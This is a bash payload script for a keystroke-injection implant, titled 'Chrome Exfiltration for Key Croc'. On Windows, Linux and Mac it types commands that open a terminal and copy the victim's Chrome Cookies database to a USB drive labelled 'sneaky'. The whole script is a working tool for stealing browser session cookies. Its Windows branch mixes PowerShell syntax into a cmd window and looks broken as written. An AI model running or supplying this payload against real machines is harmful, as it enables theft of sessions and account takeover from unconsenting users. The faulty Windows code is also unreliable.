#!/bin/bash
# Title:         Chrome Exfiltration for Key Croc
# Author:        PatBF
# Version:       0.9
#do z
function quackWindowsChrome() {
    # Open Command Prompt (non-admin)
    Q GUI r
    Q DELAY 500
    Q STRING cmd
    Q ENTER
    Q DELAY 500

    # Get USB drive path
    Q STRING '$usbPath = (Get-WMIObject Win32_Volume | ? { $_.Label -eq "sneaky" } | Select -ExpandProperty Name).Trim()'
    Q ENTER

    # Copy Chrome Cookies to USB
    Q STRING 'copy "%LOCALAPPDATA%\\Google\\Chrome\\User Data\\Default\\Cookies" '
    Q STRING '$usbPath'
    Q STRING "\\cookies_chrome.sqlite"
    Q ENTER

    # Write done file
    Q STRING 'echo done > '
    Q STRING '$usbPath'
    Q STRING "\\done.txt"
    Q ENTER
    Q ESCAPE
    Q ESCAPE
}

function quackLinuxChrome() {
    # Open terminal
    Q GUI
    Q DELAY 1500
    Q STRING "ter"
    Q DELAY 500
    Q ENTER
    Q DELAY 2000

    # Copy Chrome Cookies to USB
    Q STRING "cp ~/.config/google-chrome/Default/Cookies /media/$(whoami)/sneaky/cookies_chrome.sqlite && "
    Q STRING "echo 'done' > /media/$(whoami)/sneaky/done.txt && sync && exit"
    Q ENTER
}

function quackMacChrome() {
    # Open Terminal
    Q GUI SPACE
    Q DELAY 3000
    Q STRING "terminal"
    Q DELAY 500
    Q ENTER
    Q DELAY 3000

    # Copy Chrome Cookies to USB
    Q STRING "cp ~/Library/Application\\ Support/Google/Chrome/Default/Cookies /Volumes/sneaky/cookies_chrome.sqlite && "
    Q STRING "echo 'done' > /Volumes/sneaky/done.txt && sync && exit"
    Q ENTER
}

case $1 in
  Windows)
    quackWindowsChrome
    ;;
  Linux)
    quackLinuxChrome
    ;;
  Mac)
    quackMacChrome
    ;;
esac
